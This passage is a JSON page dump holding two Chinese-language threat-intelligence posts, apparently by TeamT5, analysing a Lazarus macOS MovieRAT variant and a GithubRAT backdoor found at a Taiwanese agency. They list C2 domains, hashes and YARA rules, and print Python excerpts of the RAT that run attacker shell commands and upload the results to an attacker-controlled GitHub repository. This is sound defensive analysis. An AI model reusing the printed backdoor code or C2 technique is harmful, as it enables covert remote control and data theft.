的連線特徵為 \"C2 + /update/ + {platform}.json\"，故 macOS 版本的 config 下載連結為 \"ht<span>tps://</span>esilet[.]com/update/darwin.json\"。所下載的惡意程式經過 UPX 加殼，會存放於系統的暫存目錄後執行。經過分析，該惡意程式的通訊協議和 MoiveRAT 相同，故確定此惡意樣本是由 MovieRAT 改寫的變種程式。\n\n<br>\n\n![2020-12-4](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909876/2020-12-4_e77cf3db22.png)\n_圖四、Esilet.dmg 下載 MovieRAT 的逆向分析截圖_\n\n<br>\n\n當 MovieRAT 成功執行後，其嘗試加入 Launch Daemons/Services，將 property lists 檔案 com.applex.services.agent.agent.plist 放置於 {HomeDirectory}/Library/LaunchAgents 目錄，若寫入失敗則會寫入至 /Library/LaunchDaemons 之中，藉此達到開機後惡意程式自動執行的持續控制手法，如圖五所示。\n\n<br>\n\n![2020-12-5](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-5_82214f3ea6.png)\n_圖五、將 plist 寫入開機執行設定之中_\n\n<br>\n\n其所連線的中繼站位址為固定並寫死（Hard Coding）於程式中，分別為 infodigitalnew.com、www.vinoymas.ch 及 sche-eg.org，如圖六所示。\n\n<br>\n\n![2020-12-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-6_a9d7f08bae.png)\n_圖六、惡意中繼站位址寫死於程式碼中_\n\n<br>\n\n樣本連線至中繼站後，駭客將會傳遞不同的指令碼（Command Code），樣本取得指令後會執行對應的動作，如上傳/下載檔案、指令執行及檔案/資訊回傳等，詳細資訊如圖七及表一所示。\n\n<br>\n\n![2020-12-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909880/2020-12-7_12bab7ef9f.png)\n_圖七、指令碼逆向分析結果_\n\n<br>\n<br>\n\n| 指令碼 | 描述 |\n| -- | -- |\n| 0x21279E | 從中繼站下載檔案並存放於特定路徑 | \n| 0x2AFCB2 | 取得主機資訊 |\n| 0x38CE55 | Heartbeat |\n| 0x3A65F8 | 字串(string)轉換為數字(integer) |\n| 0x3A6A93 | 傳送HTTP封包至中繼站 |\n| 0x3B187D | 空指令 |\n| 0x484B81 | 上傳檔案至中繼站 |\n| 0x48C82A | 透過HTTP從中繼站下載檔案|\n| 0x48D6FC | 執行指令(新加入的指令碼)|\n| 0x7FC0A4 | 執行指令並回傳結果 |\n\n_表一、指令碼清單_\n\n<br>\n\nTeamT5 經由該樣本關聯至 MovieRAT 後門程式，MovieRAT 是個輕量化的後門控制程式，支援最基本的檔案上傳/下載、指令執行及程序操作等功能。通常被駭客用於成功入侵後的第二階段控制（2nd-stage RAT）之用。先前所掌握的 MovieRAT 後門為 Windows 惡意程式，會透過 HTTP 通訊協定與中繼站連線，所使用的 Cookie 具有特定格式。\n\n根據 TeamT5 的情資，將 MovieRAT 定位到駭客組織 Lazarus 身上。Lazarus 為北韓的駭客族群，擁有多起攻擊金融產業的紀錄，尤其特別針對 SWIFT 跨國轉帳交易系統和 ATM 自動櫃員機系統進行攻擊。推測為了替北韓政權籌措資金，好發展武器與實驗，故多選擇金融產業和具有關鍵技術的私人企業進行攻擊。過往的攻擊行動中，會在惡意程式內參雜俄文，企圖混淆分析人員。近期則是開始大量入侵攻擊虛擬貨幣交易所，如 Bithumb、Youbit 及 Yapizon 等，造成上百萬美元的金額損失。\n\n## IOCs（惡意攻擊指標）\n\n|IOC|類型|\n|-|-|\n|53d9af8829a9c7f6f177178885901c01|MD5|\n|ae9f4e39c576555faadee136c6c3b2d358ad90b9|SHA1|\n|9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598|SHA256|\n|9578c2be6437dcc8517e78a5de1fa975|MD5|\n|d2a77c31c3e169bec655068e96cf4e7fc52e77b8|SHA1|\n|dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156|SHA256|\n|esilet.com|Domain|\n|www.kurunzi.news|Domain|\n|oasismagazine.africa|Domain|\n|lerenmetsara.net|Domain|\n|ht<span>tps://</span>infodigitalnew.com/wp-content/plugins/top.php |URL|\n|ht<span>tps://</span>www.vinoymas.ch/wp-content/plugins/top.php |URL|\n|ht<span>tps://</span>sche-eg.org/plugins/top.php |URL|\n\n## 影響與建議\n\n 1. 透過 TeamT5 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 檢查是否有攻擊者活動跡象，ThreatSonar 支援 Windows、Linux 及 macOS 作業系統。\n 2. 使用以下 yara rule 掃描主機系統，檢查是否存在 MovieRAT 後門程式。\n\n ```\n rule TeamT5_Lazarus_MovieRAT\n {\n     meta:\n         author        = \"TeamT5\"\n         description   = \"Lazarus - MovieRAT\"\n     strings:\n         $cookie = \"Cookie: _ga=%s%02d%d%d%02d%s; gid=%s%02d%d%03d%s\" fullword\n         $str_1 = \"GA1.%d.\" fullword\n         $str_2 = \".%d%05d%04d\" fullword\n     condition:\n         all of them\n }\n ```\n \n ![2020-12-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909882/2020-12-8_34a68e7370.png)\n\n 3. 可將前述的 IOC 清單匯入既有的資安設備中，進行偵測阻擋防禦之用。\n 4. 更多 APT 駭客族群資訊，可參考 TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/) 情資平台。\n\n<br>\n","title":"macOS 用戶當心！北韓駭客 Lazarus 將目標瞄準虛擬貨幣交易用戶","createdAt":"2020-12-10T07:32:08.061Z","updatedAt":"2020-12-15T06:48:21.344Z","__v":0,"id":"5fd1cef89f8bdc004a7fdf4b"}],"createdAt":"2020-12-10T07:32:07.952Z","updatedAt":"2021-01-27T04:40:39.817Z","__v":1,"author":{"confirmed":true,"blocked":false,"_id":"5eeae43e163518003f86d914","username":"Global Support & Service","email":"globalsupport@example.com","provider":"local","createdAt":"2020-06-18T03:49:18.738Z","updatedAt":"2020-06-30T08:49:49.293Z","__v":0,"role":"5e467d0375f9d7007998aebf","id":"5eeae43e163518003f86d914"},"topic":{"category":"blogs","_id":"5ecaa004a792d70040a0d8b0","color":"#64cda2","name":"Technical Analysis","createdAt":"2020-05-24T16:25:40.461Z","updatedAt":"2020-06-07T22:08:04.525Z","__v":0,"contents":[{"locale":"en","_id":"5edd6544bf58af004a15410d","text":"Technical Analysis","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410d"},{"locale":"tw","_id":"5edd6544bf58af004a15410e","text":"技術分析","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410e"},{"locale":"jp","_id":"5edd6544bf58af004a15410f","text":"技術分析","createdAt":"2020-06-07T22:08:04.248Z","updatedAt":"2020-06-07T22:08:04.248Z","__v":0,"id":"5edd6544bf58af004a15410f"}],"id":"5ecaa004a792d70040a0d8b0"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1607585599/the-company-3338207_1920_61abdf84cd.jpg","been_relative_posts":[{"publish":true,"enable_form":false,"tags":["5f30c347163518003f86daa6","5f30c34c163518003f86daa7","5ecf8956fedd7f004b269791","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"}],"id":"5fd1cef79f8bdc004a7fdf4a"}},"__N_SSG":true}